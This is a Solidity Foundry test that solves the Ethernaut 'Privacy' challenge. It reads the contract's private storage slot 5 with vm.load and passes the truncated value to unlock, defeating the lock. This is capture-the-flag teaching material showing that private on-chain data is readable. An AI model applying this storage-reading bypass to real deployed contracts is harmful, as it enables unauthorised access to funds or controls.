// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "ethernaut/Privacy.sol";



contract ContractTest is Test {


    Privacy privacy;

    address alice = vm.addr(0x1);
    address bob = vm.addr(0x2);

   
function setUp() public {
// [0x0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef,
//0xfedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210,
//0xabcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789]
    privacy = new Privacy([0x0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef,
                       0xfedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210,
                       0xabcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789]);
        
    }
function testRun() external{
        vm.startPrank(alice);
        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));
        privacy.unlock(bytes16(key));
        assertEq(privacy.locked(), false);
        vm.stopPrank();
    }
}